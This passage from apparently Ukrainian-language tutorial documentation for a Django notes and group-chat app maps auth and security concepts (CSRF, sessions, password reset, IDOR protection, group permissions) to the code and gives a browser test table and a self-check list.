│   ├── consumers.py         ★ GroupChatConsumer (WebSocket, membership check)
│   ├── urls.py              ★ /groups/ + /register/ URL patterns
│   ├── context_processors.py ← sidebar: notebooks + tags (без змін)
│   └── templates/notes_app/
│       ├── note_list.html       ← Q-filter нотатки (особисті + групові)
│       ├── note_form.html       ← group поле у формі
│       ├── group_list.html      ← картки груп з member_count  ★
│       ├── group_form.html      ← форма назви нової групи     ★
│       ├── group_detail.html    ← учасники, action=add/remove/leave ★
│       └── group_confirm_delete.html ← SET_NULL пояснення    ★
│
└── templates/
    ├── base.html                ← Bootstrap CDN, messages block
    ├── layouts/
    │   └── dashboard.html       ← "Групи" у sidebar + dropdown:
    │                               "Змінити пароль", "Вийти" (POST logout)
    ├── registration/
    │   ├── login.html           ★ CSRF токен, "next" hidden input
    │   ├── register.html        ★ UserCreationForm + crispy
    │   ├── password_reset_form.html    ★ email форма
    │   ├── password_reset_done.html    ★ DEV: підказка про docker logs
    │   ├── password_reset_confirm.html ★ validlink check + crispy form
    │   ├── password_reset_complete.html ★ успіх + посилання login
    │   ├── password_reset_email.html   ★ текст листа (protocol/domain/token)
    │   ├── password_change_form.html   ★ PasswordChangeForm + crispy
    │   └── password_change_done.html   ★ успіх
    └── components/
        ├── empty_state.html
        ├── pagination.html
        └── confirm_modal.html
```

---

## Перевірка у браузері

| Дія | URL | Що перевіряти |
|-----|-----|---------------|
| Реєстрація | `/register/` | Auto-login → redirect `/notes/` |
| Login | `/accounts/login/` | session cookie у DevTools → Application → Cookies |
| Login CSRF | DevTools → Application → Cookies | csrftoken присутній |
| Logout | POST кнопка | Cookie sessionid видалено |
| Password Reset | `/accounts/password_reset/` | Email у `docker compose logs web` |
| Токен expired | `/accounts/reset/...` (стара URL) | `validlink=False` → "Посилання недійсне" |
| IDOR тест | `/notes/2/edit/` (чужа нотатка) | 404 (не 403!) |
| Password Change | `/accounts/password_change/` | old_password перевіряється |
| Група | `/groups/new/` → `/groups/<pk>/` | creator є учасником |
| Групові нотатки | Позначити нотатку групою | Інший член бачить у /notes/ |
| Group chat | `/groups/<pk>/chat/` | WebSocket підключення |
| DELETE group | `/groups/<pk>/delete/` → POST | Нотатки стають особистими (group=NULL) |

---

## Підсумок: що і де шукати

| Концепція | Де у коді |
|-----------|-----------|
| **AuthN vs AuthZ** | `views.py` — `@login_required` + Q-filter для доступу + `note.user != request.user` для редагування |
| **Middleware chain** | `settings.py` — `MIDDLEWARE` список + порядок |
| **Session flow** | `settings.py` — `SESSION_COOKIE_*` + Django session framework |
| **Login/Logout** | `templates/registration/login.html` + `urls.py` auth.urls |
| **POST logout** | `dashboard.html` — `<form method="post" action="{% url 'logout' %}">` |
| **Password Reset** | `templates/registration/password_reset_*.html` (5 файлів) |
| **DEV email** | `docker compose logs -f web` — знайти URL `/accounts/reset/...` |
| **Password Change** | `templates/registration/password_change_*.html` + dashboard dropdown |
| **IDOR захист** | `views.py` — особисті об'єкти: `get_object_or_404(Notebook, pk=pk, user=...)`, спільні: Q-filter + owner check |
| **404 не 403** | `views.py` — "не розкривати факт існування чужого об'єкта" |
| **Group FK SET_NULL** | `models.py` — `Note.group` + `ShoppingList.group` |
| **Q-filter** | `selectors.py` — `Q(user=user) \| Q(group__in=user_groups)` |
| **N+1 захист** | `selectors.py` — `select_related('notebook', 'group')`, `prefetch_related('tags')` |
| **Group CRUD** | `services.py` — `create_group`, `add_user_to_group`, `delete_group` |
| **3-action POST** | `views.py group_detail` — `action='add'/'remove'/'leave'` |
| **SET_NULL cascade** | `group_confirm_delete.html` — пояснення поведінки |
| **Security settings** | `settings.py` — `HTTPONLY, SAMESITE, X_FRAME_OPTIONS, DEBUG=False` |
| **ngrok CSRF** | `settings.py` — `CSRF_TRUSTED_ORIGINS` з `NGROK_DOMAIN` env |
| **PBKDF2 паролі** | `auth_user.password` поле — `pbkdf2_sha256$600000$salt$hash` |

---

## Чеклист самоперевірки

- [ ] `@login_required` і `LOGIN_URL` у `settings.py` налаштовані
- [ ] `include("django.contrib.auth.urls")` підключено в `urls.py`
- [ ] Шаблони `registration/login.html` і `registration/register.html` існують
- [ ] `{% csrf_token %}` у кожній формі з `method="post"`
- [ ] Особисті об'єкти: `get_object_or_404(Model, pk=pk, user=request.user)`; спільні (Note): Q-filter + `note.user != request.user` перед записом
- [ ] Password Reset flow протестований (посилання у `docker compose logs web`)
- [ ] `validlink` перевірка у `password_reset_confirm.html`
- [ ] Q-filter `Q(user=user) | Q(group__in=user_groups)` у `selectors.py`
- [ ] `SESSION_COOKIE_HTTPONLY = True` і `X_FRAME_OPTIONS = "DENY"` у settings.py
- [ ] Logout — POST запит (не GET посилання)
- [ ] Group delete — пояснює що нотатки стають особистими (не видаляються)

---

## Далі

Наступний крок: [06 — Testing](06_testing.md) — TestCase, AAA паттерн, service/view тести, Selenium E2E.

Модулі документації:
- [README_6.md](README_6.md) — Auth & Security: детальний туторіал з повним кодом (crispy_notes_project)
- [README_9.md](README_9.md) — Production Stack: Docker+nginx+ngrok+Redis для notes_chat_app
- [docs/07_auth_and_security/](../07_auth_and_security/) — теоретичні матеріали: OWASP, Zero Trust, SIEM
